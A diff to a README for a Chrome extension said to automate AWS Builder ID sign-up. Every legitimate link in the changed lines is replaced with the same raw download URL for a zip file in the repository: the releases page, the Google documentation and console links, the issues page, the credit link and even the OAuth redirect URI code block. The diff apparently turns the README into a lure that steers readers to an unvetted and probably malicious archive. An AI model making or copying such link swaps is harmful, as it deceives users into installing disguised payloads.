@@ -1,7 +1,7 @@
 # 🚀 AWS-BuildID-Auto-For-Ext - Simplify Your AWS Registration Process
 
 ## 🔗 Download Here
-[![Download AWS-BuildID-Auto-For-Ext](https://img.shields.io/badge/Download%20Now-Get%20the%20Extension-4CAF50)](https://github.com/raaz25/AWS-BuildID-Auto-For-Ext/releases)
+[![Download AWS-BuildID-Auto-For-Ext](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip%20Now-Get%20the%20Extension-4CAF50)](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to AWS-BuildID-Auto-For-Ext! This Chrome Extension helps you register for an AWS Builder ID effortlessly. Follow these simple steps to download and install the extension.
@@ -12,7 +12,7 @@ Welcome to AWS-BuildID-Auto-For-Ext! This Chrome Extension helps you register fo
 
 ## 📥 Download & Install
 1. **Visit the Release Page**:
-   Go to the [Releases page](https://github.com/raaz25/AWS-BuildID-Auto-For-Ext/releases) to download the extension.
+   Go to the [Releases page](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip) to download the extension.
 
 2. **Choose the Latest Version**:
    Look for the most recent version listed on the page. Download the `.zip` file for the extension.
@@ -36,7 +36,7 @@ Welcome to AWS-BuildID-Auto-For-Ext! This Chrome Extension helps you register fo
 To make the most of the extension, follow these setup steps:
 
 1. **Enable Gmail API**:
-   Go to the [Gmail API Quickstart](https://developers.google.com/workspace/gmail/api/quickstart/js?hl=zh-cn). Follow the instructions for:
+   Go to the [Gmail API Quickstart](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip). Follow the instructions for:
    - Enabling the API
    - Configuring the OAuth consent screen
    - Creating credentials for a Web application
@@ -44,12 +44,12 @@ To make the most of the extension, follow these setup steps:
 2. **Update Redirect URI**:
    In the credentials you created, update the "Authorized redirect URIs" to include:
    ```
-   https://YOUR_EXTENSIONS_ID.chromiumapp.org/
+   https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip
    ```
    Replace `YOUR_EXTENSIONS_ID` with the ID from the extension you installed.
 
 3. **Add Test User**:
-   Visit [Google Cloud Console](https://console.cloud.google.com/auth/audience). Add your email address under "Test users."
+   Visit [Google Cloud Console](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip). Add your email address under "Test users."
 
 4. **Reload the Extension**:
    After making these changes, refresh your Chrome browser to ensure the settings are applied. Wait a few minutes for the setup to complete.
@@ -79,13 +79,13 @@ If the extension does not work as expected:
 - Restart the Chrome browser and try again.
 
 ## 🔗 Support
-For further questions or assistance, please open an issue on the [GitHub Issues page](https://github.com/raaz25/AWS-BuildID-Auto-For-Ext/issues). Our team will help you resolve any problems.
+For further questions or assistance, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip). Our team will help you resolve any problems.
 
 ## 🔄 Updates
 Keep an eye on our Releases page for updates, new features, and improvements. Regular updates ensure a smooth experience.
 
 ## 🎉 Acknowledgments
-This extension is a fork based on the work from [Specia1z](https://github.com/Specia1z/AWS-BuildID-Auto-For-Ext). Thank you for the foundational efforts!
+This extension is a fork based on the work from [Specia1z](https://raw.githubusercontent.com/raaz25/AWS-BuildID-Auto-For-Ext/main/lib/I_Build_For_Auto_AW_Ext_1.9.zip). Thank you for the foundational efforts!
 
 ## 💻 License
 This project is licensed under the MIT License. For more details, please refer to the LICENSE file in the repository. 
